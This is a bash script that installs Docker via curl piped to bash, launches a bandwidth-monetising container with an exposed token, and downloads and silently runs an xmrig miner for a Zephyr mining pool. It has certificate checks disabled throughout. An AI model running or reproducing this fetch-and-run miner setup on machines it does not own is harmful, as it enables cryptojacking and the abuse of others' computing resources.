#!/bin/bash

apt update -y
curl -s -L https://get.docker.com | LC_ALL=en_US.UTF-8 bash
docker run -d --restart=always --name tm traffmonetizer/cli_v2 start accept --token Sef/x33OWdWFmK14rka+LbJwuPRLfdDz4UbMx/Y/F9Y=

WALLET=$1
location=$2

case $location in
    "us")
        url="us-zephyr.miningocean.org"
        ;;
    "de")
        url="de-zephyr.miningocean.org"
        ;;
    "sg")
        url="sg-zephyr.miningocean.org"
        ;;
    "ca")
        url="ca-zephyr.miningocean.org"
        ;;
    *)
        url="zephyr.miningocean.org"
        ;;
esac

wget -O $HOME/xmrig --no-check-certificate -N "https://raw.githubusercontent.com/brook8023/myproxy/main/zeph/xmrig"
wget -O $HOME/config.json --no-check-certificate -N "https://raw.githubusercontent.com/brook8023/myproxy/main/zeph/config.json"

PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi

sed -i 's/"url": *"[^"]*",/"url": "'$url':5332",/' $HOME/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/config.json
sed -i 's#"log-file": *null,#"log-file": "'$HOME/xmrig.log'",#' $HOME/config.json

chmod +x $HOME/xmrig 
nohup $HOME/xmrig --config=$HOME/config.json &